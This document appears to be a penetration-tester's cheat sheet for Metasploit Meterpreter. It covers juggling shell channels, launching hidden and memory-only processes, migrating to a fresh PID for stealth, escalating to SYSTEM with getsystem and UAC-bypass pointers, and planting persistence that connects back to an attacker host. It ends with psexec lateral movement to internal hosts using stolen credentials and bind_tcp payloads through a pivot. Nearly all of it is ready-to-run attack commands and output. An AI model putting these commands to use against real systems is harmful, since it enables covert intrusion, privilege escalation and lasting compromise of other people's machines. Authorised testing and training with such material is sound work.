Meterpreter Channel Management

Each shell/process spawned inside a meterpreter session gets its own channel. Juggle them without dropping the session.

execute -H -i -f cmd.exe     # spawn cmd hidden interactive — this is a channel
channel -l                   # list open channels
channel -i <N>               # interact with channel N (switch shells)
channel -c <N>               # close channel N

Useful when you want a foreground shell AND a background listener from the same meterpreter session.

execute — Spawn Processes on the Target

execute -f notepad.exe                     # visible, foreground
execute -H -f notepad.exe                  # -H = hidden window
execute -H -i -f cmd.exe                   # -i = interactive (attach to stdin/stdout)
execute -H -f payload.exe                  # fire-and-forget silent
execute -H -f cmd.exe -a "/c whoami"       # -a = arguments
execute -m -d calc.exe -f /root/wce.exe    # -m = memory-only (in-memory PE loader), -d = process to appear as (calc.exe)

## After spawning, migrate to the new PID for stealth
ps                                          # find your fresh PID
migrate <PID>

Flag legend:

  • -H — hidden window (no visible cmd popup)
  • -i — interactive channel (see channel management above)
  • -f <file> — the executable to run
  • -a "<args>" — command-line arguments
  • -m — memory-only (RunAsRegularUser reflective load — no disk write)
  • -d <name> — dummy process name (spoofs the parent-name display)
  • -c — creates a new console
  • -w — wait for the process to exit

Meterpreter Advanced

Get System Privileges

getsystem
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).

getuid
Server username: NT AUTHORITY\SYSTEM

getsystem technique legend — the "via technique N" line means:

Technique Method Requires
1 Named Pipe Impersonation (In Memory/Admin) Local admin + SeImpersonatePrivilege
2 Named Pipe Impersonation (Dropper/Admin) Same as 1 but drops binary to disk
3 Named Pipe Impersonation (RPCSS variant) Local admin
4 Token Duplication Local admin + SeDebugPrivilege
5 Named Pipe Impersonation (PrintSpooler variant) Print Spooler service reachable

If getsystem prints "the requested operation requires elevation", you're not admin -> use a UAC bypass first (e.g. use exploit/windows/local/bypassuac_sdclt) or a privesc exploit.

Try a specific technique explicitly:

getsystem -t 1

Persistence with Startup

meterpreter > run persistence -U -p 4242

Options:

  • -A - Automatically start a matching exploit/multi/handler
  • -L <opt> - Location in target host to write payload
  • -P <opt> - Payload to use (default: windows/meterpreter/reverse_tcp)
  • -S - Start agent on boot as a service (SYSTEM privileges)
  • -U - Start agent when the user logs on
  • -X - Start agent when the system boots
  • -i <opt> - Interval in seconds between connection attempts
  • -p <opt> - Port on the attacker machine
  • -r <opt> - IP of the attacker machine listening for the connect back

Pivoted-target payload gotcha — use bind_tcp, not reverse_tcp:

When you exploit an INTERNAL host through a Meterpreter pivot, a reverse payload can't call back — the internal host has no route to Kali. Bind payloads flip the direction: Kali connects TO the internal host via the pivot.

msf6 > use exploit/windows/smb/psexec
msf6 exploit(psexec) > set RHOSTS <INTERNAL_TARGET>
msf6 exploit(psexec) > set SMBUser <USER>
msf6 exploit(psexec) > set SMBPass <PASS>
msf6 exploit(psexec) > set payload windows/x64/meterpreter/bind_tcp
msf6 exploit(psexec) > set LPORT 8000                        # port on the INTERNAL target
msf6 exploit(psexec) > set RHOST <INTERNAL_TARGET>           # confirm
msf6 exploit(psexec) > exploit -j

Metasploit connects OUT from Kali -> through autoroute'd pivot -> IN to <INTERNAL_TARGET>:8000 and picks up the session. No callback traffic needed.

Same principle for windows/x64/shell/bind_tcp, linux/x64/meterpreter/bind_tcp, etc.
